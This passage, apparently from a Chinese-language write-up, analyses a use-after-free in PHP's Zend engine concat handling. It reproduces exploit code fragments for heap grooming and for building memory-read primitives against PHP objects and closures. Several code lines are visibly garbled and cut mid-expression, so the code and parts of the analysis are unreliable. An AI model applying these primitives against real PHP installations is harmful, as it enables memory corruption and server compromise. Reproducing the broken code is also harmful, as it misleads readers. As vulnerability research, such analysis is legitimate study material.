@@ -1,0 +1,163 @@
+                }
+            }
+        }
+        private function log($format, $val = "") {
+            if(self::LOGGING) {
+                printf("{$format}\n", $val);
+            }
+        }
+        static function alloc($size) {
+            return str_shuffle(str_repeat("A", $size));
+        }
+        static function str2ptr($str, $p = 0, $n = 8) {
+            $address = 0;
+            for($j = $n - 1; $j >= 0; $j--) {
+                $address 
+## 2\. UAF分析
+`set_error_handler`会设置错误处理句柄，当PHP执行报错时，调用该函数
+`.=`是PHP赋值操作附加字符串连接，这里对应操作是`ZEND_ASSIGN_DIM_OP`，意思就是数组降维，说白了就是取数组元素。
+赋值的参数是`zval（IS_STRING：66*'\0'）`，被赋值的是一个zend_empty_array，然后进入
+`zend_binary_op`进行赋值操作
+参数列表是`（ret=arr[1]，op1=arr[1]，op2=zval@66*'\0'）`，此处因为是`.=` ，即自赋值，返回值和op1是一样的
+`zend_binary_op`函数中定义了各种不同类型的操作句柄，由Opcode的扩展值决定使用那种操作
+    static zend_always_inline int zend_binary_op(zval *ret, zval *op1, zval *op2 OPLINE_DC)
+    {
+        static const binary_op_type zend_binary_ops[] = {
+            add_function,
+            sub_function,
+            mul_function,
+            div_function,
+            mod_function,
+            shift_left_function,
+            shift_right_function,
+            concat_function,
+            bitwise_or_function,
+            bitwise_and_function,
+            bitwise_xor_function,
+            pow_function
+        };
+        /* size_t cast makes GCC to better optimize 64-bit PIC code */
+        size_t opcode = (size_t)opline->extended_value;
+        return zend_binary_ops[opcode - ZEND_ADD](ret, op1, op2);
+    }
+    //op                           fetch          ext  return  operands
+    //ASSIGN_DIM_OP                .=               8          !0, 1
+    //此处的扩展值是8，即调用concat_function进行操作
+\$arr存了一串Bucket，每个Bucket里面带了一个zval，对于\$arr来说，每个元素是一个zend_array
+跟进`concat_function`：
+首先验证op1是不是字符串，如果不是，字符串，就尝试使用`zval_get_string_func(op1)`从中得到字符串
+跟进`zval_get_string_func`：
+判断类型，发现是IS_ARRAY，调用zend_error，触发回调错误处理句柄
+    abc = self::alloc(self::STRING_SIZE);
+`STRING_SIZE`在调试环境下始终是47，分配到0x80=128B的内存空间。
+前面提到的`Array+66*A`长度也是`STRING_SIZE`，二者占据的大小相同，空间相邻。
+    $fill = self::alloc(self::STRING_SIZE);
+是为了消耗掉`Array+66*A`前面的0x80的空间，避免`$this->abc`分配到其前面，导致后面计算abc的地址的计算方法错误（==有一个问题，为何Array+66*A前面还会有空间空着==）
+    $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
+> 有一个问题，为何Array+66*A前面还会有空间空着：
+>
+> 根据调试，这是op2参数的位置。。。，用完之后会被释放，即0x7ffff3a84500在链表首。
+回到前面，abc的位置已经被确定。即0x7ffff3a84580+ 0x80 = 0x7ffff3a84600。
+此时进行了另一个操作
+    $this->free($abc_addr);
+        private function free($addr) {
+            $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr); 
+            $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));//320B的空间
+            $arr = [[], []];//320B的空间
+            set_error_handler(function() use (&$arr, &$buf, &$payload) {
+                $arr = 1;
+                $buf = str_repeat($payload, 1);//数组的320B被填充
+            });
+            $arr[1] .= "x";
+        }
+free函数的功能很明显和heap_leap很相似，只不过填充arData空间的不再是全0。根据前面的分析，这里又分配了一个320字节的块，并用`pack("Q*",
+0xdeadbeef, 0xcafebabe, 0x7ffff3a84580).AAA...AAA`填充，
+**重点：**
+然后，在销毁该哈希表的时候，会销毁其中的所有Bucket里的内容。此处的哈希表地址是0x00007ffff3a5e680，arData就在0x00007ffff3a5e688，
+`$arr[1]` 就在`0x00007ffff3a5e6a8`，显然这里存储了一个zval
+    zval_struct{
+        .value = 0x00007ffff3a5e6a8;
+        .u1.v.type = 6
+    }
+这里就会被识别为一个字符串，然后其引用值为1，释放的时候就会被直接释放掉。所以`$this->abc`这里的0x80 = 128字节就会空出来
+free函数执行完后，buf是指向长度0xdeadbeef的字符串，zend_string地址在0x7ffff3a5e680，`$arr[1] .=
+"x"`的结构存储在0x00007ffff3a92f80;
+继续，
+    $this->helper = new Helper;
+            if(strlen($this->abc) helper->a = "leet";
+            $this->helper->b = function($x) {};
+            $this->helper->c = 0xfeedface;
+这里新建了一个类，对应`ZEND_NEW`操作，其会从`EG(class_table)`全局类表中找到对应的`zend_class_entry`结构的地址，此处为0x7ffff3a04018，该结构大小为456B，然后调用object_init_ex初始化一个对象出来（0x7ffff3a84600）。分配对象的时候用到了zend_objects_new，计算出的需要分配的大小是
+`56 + 16*2 +32= 120` 其中（`(ce->ce_flags & ZEND_ACC_USE_GUARDS) =
+1`），刚好分配到`free(abc)`所得到的空间。
+其中的成员变量`b`被赋予了一个闭包函数，即从`EG(function_table)`里面找到了`zend_function`结构，该结构大小224，该闭包函数的名字是`%00%7Bclosure%7D%2Fhome%2Fxxxxx%2Fphp-src%2Ftest.php%3A58%240`（注意url解码）。`zend_function`结构和`zend_op_array`具有相同大小，切二者拥有相同的common部分
+    union _zend_function {
+        zend_uchar type;    /* MUST be the first element of this struct! */
+        uint32_t   quick_arg_flags;
+        struct {
+            zend_uchar type;  /* never used */
+            zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */
+            uint32_t fn_flags;
+            zend_string *function_name;
+            zend_class_entry *scope;
+            zend_function *prototype;
+            uint32_t num_args;
+            uint32_t required_num_args;
+            zend_arg_info *arg_info;
+        } common;
+        zend_op_array op_array;
+        zend_internal_function internal_function;
+    };
+然后是计算helper对象的地址
+    $helper_handlers = $this->rel_read(0);
+        private function rel_read($offset) {
+            return self::str2ptr($this->abc, $offset);
+        }   
+        static function str2ptr($str, $p = 0, $n = 8) {
+            $address = 0;
+            for($j = $n - 1; $j >= 0; $j--) {
+                $address abc`会引用到一块已经空闲的0x80=128大小的空间，分配的helper对象刚好能够占用上次free掉abc时释放出来的128B的空间，于是`$this->abc`现在可以根据偏移量取到helper对象对应的zend_objects结构里面的数据。
+    struct _zend_object {
+        zend_refcounted_h gc;//8B
+        uint32_t          handle; // TODO: may be removed ???
+        zend_class_entry *ce;
+        const zend_object_handlers *handlers;
+        HashTable        *properties;
+        zval              properties_table[1];
+    };
+    struct _zend_string {
+        zend_refcounted_h gc;
+        zend_ulong        h;                /* hash value */
+        size_t            len;
+        char              val[1];
+    };
+    //根据这两个结构的对比以及字节对齐的原理，val处的值就是对象对应的zend_object_handlers，字符串长度就是ce的地址
+    ZEND_API zend_object* ZEND_FASTCALL zend_objects_new(zend_class_entry *ce)
+    {
+        zend_object *object = emalloc(sizeof(zend_object) + zend_object_properties_size(ce));
+        _zend_object_std_init(object, ce);
+        object->handlers = &std_object_handlers;
+        return object;
+    }
+    static zend_always_inline size_t zend_object_properties_size(zend_class_entry *ce)
+    {
+        return sizeof(zval) *
+            (ce->default_properties_count -                ((ce->ce_flags & ZEND_ACC_USE_GUARDS) ? 0 : 1));
+    }
+据此，可以读取到helper的zend_object中的handlers地址
+    $helper_handlers = $this->rel_read(0);
+然后是closure，这里其实读到的就是`$helper->b`对应的`zend_object`结构的地址（zval中的地址值存储在最前面）
+    $closure_addr = $this->rel_read(0x20);
+    self::log("real closure @ 0x%x", $closure_addr);
+再然后是读取closure_ce，
+    $closure_ce = $this->read($closure_addr + 0x10);
+    self::log("closure class_entry @ 0x%x", $closure_ce);
+        private function rel_write($offset, $value, $n = 8) {
+            for ($i = 0; $i abc[$offset + $i] = chr($value & 0xff);
+                $value >>= 8;
+            }
+        }
+        private function read($addr, $n = 8) {
+            $this->rel_write(0x10, $addr - 0x10);
+            $value = strlen($this->helper->a);
+            if($n !== 8) { $value &= (1 a`的zval，更改其value字段为要读取的addr-0x10，就能使用字符串长度获取到对应的值（len字段在zend_string的0x10偏移处，读取len就需要给定zend_string的地址，即将zval的value字段覆盖为addr-0x10）
